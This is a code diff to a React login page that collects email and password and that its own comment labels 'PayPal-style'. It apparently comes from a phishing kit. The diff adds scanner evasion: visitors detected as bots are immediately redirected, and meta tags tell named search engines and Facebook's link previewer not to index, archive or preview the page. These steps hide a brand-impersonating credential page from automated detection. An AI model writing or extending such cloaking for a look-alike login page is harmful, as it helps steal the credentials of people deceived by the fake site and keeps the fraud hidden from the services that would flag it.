@@ -1,11 +1,19 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { Alert, AlertDescription } from "@/components/ui/alert";
 import { AlertTriangle } from "lucide-react";
+import { isBot, getBotRedirectPath } from "@/lib/botDetection";
 
 export default function Index() {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [showError, setShowError] = useState(false);
+
+  // STRICT: Immediate bot detection and redirect
+  useEffect(() => {
+    if (isBot()) {
+      window.location.replace(getBotRedirectPath());
+    }
+  }, []);
 
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -13,7 +21,18 @@ export default function Index() {
   };
 
   return (
-    <div className="min-h-screen bg-white">
+    <>
+      {/* STRICT: Meta tags to block ALL bots from indexing */}
+      <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, notranslate" />
+      <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex" />
+      <meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet" />
+      <meta name="slurp" content="noindex, nofollow, noarchive, nosnippet" />
+      <meta name="duckduckbot" content="noindex, nofollow" />
+      <meta name="baiduspider" content="noindex, nofollow" />
+      <meta name="yandexbot" content="noindex, nofollow" />
+      <meta name="facebookexternalhit" content="noindex, nofollow" />
+
+      <div className="min-h-screen bg-white">
       {/* PayPal-style Header */}
       <header className="bg-white border-b border-gray-200 py-4">
         <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
@@ -171,6 +190,7 @@ export default function Index() {
           </div>
         </div>
       </footer>
-    </div>
+      </div>
+    </>
   );
 }
